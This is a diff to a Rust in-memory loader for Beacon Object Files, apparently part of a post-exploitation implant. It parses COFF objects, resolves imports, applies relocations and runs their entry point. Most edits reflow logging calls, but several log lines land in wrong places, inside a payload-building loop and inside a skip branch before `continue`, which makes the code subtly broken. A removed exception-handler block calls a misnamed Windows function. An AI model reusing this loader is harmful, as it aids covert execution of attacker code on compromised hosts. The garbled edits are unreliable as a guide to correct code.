@@ -137,12 +137,7 @@ pub fn coffee_execute(
         };
     }
 
-    tracing::info!(
-        sections = header.number_of_sections,
-        symbols = header.number_of_symbols,
-        obj_size = object_data.len(),
-        "BOF: COFF header parsed"
-    );
+    tracing::info!(sections = header.number_of_sections, symbols = header.number_of_symbols, obj_size = object_data.len(), "BOF: COFF header parsed");
 
     let num_sections = header.number_of_sections as usize;
     let sec_table_offset = COFF_HEADER_SIZE + header.size_of_optional_header as usize;
@@ -319,11 +314,7 @@ pub fn coffee_execute(
 
     // ── Resolve external imports ────────────────────────────────────────
 
-    tracing::info!(
-        external_count = external_symbols.len(),
-        "BOF: resolving external imports"
-    );
-
+    tracing::info!(external_count = external_symbols.len(), "BOF: resolving external imports");
     // BOF output buffer — Beacon API callbacks (BeaconPrintf / BeaconOutput)
     // append to this Vec through the thread-local `BOF_OUTPUT_TLS`.
     let mut bof_output: Vec<u8> = Vec::new();
@@ -420,17 +411,13 @@ pub fn coffee_execute(
     }
 
     // Report missing symbols
-    tracing::info!(
-        resolved = resolved_imports.len(),
-        missing = missing_symbols.len(),
-        "BOF: import resolution complete"
-    );
     if !missing_symbols.is_empty() {
         let mut callbacks = Vec::new();
         for sym in &missing_symbols {
             let mut payload = Vec::new();
             let sym_bytes = sym.as_bytes();
             payload.extend_from_slice(&(sym_bytes.len() as u32).to_le_bytes());
+    tracing::info!(resolved = resolved_imports.len(), missing = missing_symbols.len(), "BOF: import resolution complete");
             payload.extend_from_slice(sym_bytes);
             callbacks.push(BofCallback {
                 callback_type: BOF_SYMBOL_NOT_FOUND,
@@ -462,10 +449,9 @@ pub fn coffee_execute(
 
     // ── Apply relocations ───────────────────────────────────────────────
 
-    tracing::info!("BOF: applying relocations");
-
     for (sec_idx, sec) in sections.iter().enumerate() {
         if sec.number_of_relocations == 0 || section_bases[sec_idx].is_null() {
+    tracing::info!("BOF: applying relocations");
             continue;
         }
 
@@ -566,13 +552,9 @@ pub fn coffee_execute(
             );
         }
     }
+    tracing::info!(entry_found = entry_point.is_some(), "BOF: memory protections set, ready to execute");
 
     // ── Execute the entry point ─────────────────────────────────────────
-
-    tracing::info!(
-        entry_found = entry_point.is_some(),
-        "BOF: memory protections set, ready to execute"
-    );
 
     // Install the output buffer into TLS so Beacon API callbacks can
     // append output during execution.
@@ -582,32 +564,7 @@ pub fn coffee_execute(
         // BOF entry: void go(char* args, int arg_len)
         type BofEntry = unsafe extern "C" fn(*const u8, u32);
         let func: BofEntry = unsafe { std::mem::transmute(ep) };
-
         tracing::info!(ep = format!("{:p}", ep), "BOF: calling entry point go()");
-
-        // Install a Vectored Exception Handler to catch access violations
-        // during BOF execution. Rust's catch_unwind does NOT catch hardware
-        // exceptions (SEH) on Windows, so we need VEH to prevent process death.
-        static VEH_COOKIE: std::sync::OnceLock<unsafe extern "system" fn(*mut core::ffi::c_void) -> i32> = std::sync::OnceLock::new();
-        
-        // Use a static to store the "jump back" address for exception recovery
-        static BOF_EXCEPTION_FLAG: std::sync::atomic::AtomicBool = std::sync::atomic::AtomicBool::new(false);
-        
-        extern "system" fn bof_veh_handler(exception_info: *mut core::ffi::c_void) -> i32 {
-            // EXCEPTION_CONTINUE_EXECUTION = -1, EXCEPTION_CONTINUE_SEARCH = 0
-            // Mark that we caught an exception and tell the OS to continue search
-            // (the process will crash, but at least we log it)
-            BOF_EXCEPTION_FLAG.store(true, std::sync::atomic::Ordering::SeqCst);
-            tracing::error!("BOF: VEH caught exception during execution");
-            0 // EXCEPTION_CONTINUE_SEARCH — let the process crash so we see the code
-        }
-        
-        let veh_handle = unsafe {
-            windows_sys::Win32::System::Diagnostics::Debug::AddVectoredExceptionHandlerHandler(
-                1, // first handler
-                Some(bof_veh_handler),
-            )
-        };
 
         // Use SEH-style guard (simplified: catch panics)
         let exec_result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| unsafe {
@@ -616,7 +573,6 @@ pub fn coffee_execute(
 
         match exec_result {
             Ok(()) => {
-                tracing::info!(output_len = bof_output.len(), "BOF: execution completed successfully");
                 let mut cbs = Vec::new();
                 // If there's captured output, send it
                 if !bof_output.is_empty() {
@@ -637,7 +593,6 @@ pub fn coffee_execute(
                 cbs
             }
             Err(_) => {
-                tracing::error!("BOF: execution panicked (access violation)");
                 vec![BofCallback {
                     callback_type: BOF_EXCEPTION,
                     payload: {
